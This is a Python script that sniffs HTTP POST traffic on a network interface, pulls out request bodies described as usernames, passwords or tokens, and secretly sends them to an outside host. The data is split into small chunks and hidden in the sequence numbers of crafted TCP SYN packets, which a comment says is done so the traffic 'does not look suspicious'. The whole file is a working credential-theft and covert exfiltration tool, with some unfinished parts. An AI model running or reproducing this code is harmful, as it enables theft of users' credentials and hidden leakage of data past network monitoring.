import pyshark
import re
from scapy.all import *

hostIP = '10.1.1.2'
#hostIP = '204.15.135.8'

"""
This function intercepts packets and sends every POST req to checkForJewelry or sends it immediately as it is.
"""
def work(intr):
    cap = pyshark.LiveCapture(interface=intr, bpf_filter='tcp port 80')
    print("Started timeout=10")
    cap.sniff(timeout=10)
    print("Finished")
    regexp = re.compile(r'POST+\s+.+\sHTTP*.*\w')
    for pkt in cap:
        try:
            data = str(pkt.http)
            if regexp.search(data):
                # Payload is what has been sent.
                payload = extractPayload(pkt.tcp.payload)
                data = checkForJewelry(payload)
                sendIt(data, payload)
        except:
            pass
    pass

"""
This function returns "payload" as ascii
"""
def extractPayload(payload):
    payload = str(payload).replace(':', '')
    payloadFinal = ''
    max = len(payload)
    for i in range(0,max,2):
        try:
            chunk = int(payload[i:i+2], 16)
            payloadFinal += str(chr(chunk))
        except:
            pass
    return payloadFinal

"""
For now, it just takes everythin after \r\n\r\n

This is an advanced function that will strip the username and password from the req.

Return: Just the "Jewelry" Which coudl be username and password - Tokens - Whatever you want.
"""
def checkForJewelry(data):
    data = data.split('\r\n\r\n')[1]
    return data
    pass



"""
This function divides the data into many chunks of 4bytes and return it as a list.
"""
def divide(data):
    dataList = []
    max = len(data)
    for i in range(0,max,4):
        chunk = data[i:i+4]
        dataList.append(chunk)
    return dataList


"""
This function converts the chunks to hex and send them with the same payload.

Payload is ascii string
chunk is a chunk of 4 bytes
"""
def craftHttpPacket(chunk,payload):
    ISN = ''
    ISN_ascii = ''
    for c in chunk:
        ISN = str(ord(c))
        print(ISN)
        sendcraftedHttpPacket(hostIP, ISN)
        ISN_ascii += c


"""
Sends data to the receiver, using the same payload so that it does not look suspicious
"""
def sendIt(data,payload):
    dataList = divide(data)
    for chunk in dataList:
        print(chunk,' Sent')
        craftHttpPacket(chunk,payload)

"""
Takes payload,seq

seq = 12345
payload = "GET / HTTP/1.0\r\nHOST: testing-ground.scraping.pro\r\n\r\n"
"""
def sendcraftedHttpPacket(hostIP,seqI):
    if len(hostIP) < 0:
        hostIP = '204.15.135.8'
    seqI = int(seqI)
    seq = seqI
    sport = 1040
    dport = 80
    # SYN
    ip = IP(dst=hostIP)
    SYN = TCP(sport=sport, dport=dport, flags='S', seq=seq)
    SYNACK = sr1(ip / SYN)


def main():
    while 1:
        work('eth1')
        break
    print("Work() finished")


if __name__ == '__main__':
    main()
    # Tests:
    #craftHttpPacket("usr=", "")
    pass
